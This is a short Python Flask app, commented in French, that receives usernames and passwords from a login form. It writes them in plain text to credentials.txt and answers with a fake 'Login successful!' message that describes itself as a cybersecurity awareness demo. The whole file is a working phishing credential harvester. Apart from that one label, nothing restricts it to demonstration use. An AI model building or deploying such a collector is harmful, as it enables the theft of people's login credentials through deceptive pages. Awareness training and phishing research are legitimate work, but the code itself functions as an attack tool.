from flask import Flask, request

app = Flask(__name__)

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form['username']
    password = request.form['password']
    
    # Sauvegarde dans un fichier (sur Netlify, le système de fichiers est éphémère)
    with open('credentials.txt', 'a') as f:
        f.write(f'Username: {username}, Password: {password}\n')
    
    return 'Login successful! (This is a cybersecurity awareness demo)'

# Point d'entrée pour le développement local
if __name__ == '__main__':
    app.run(port=8000)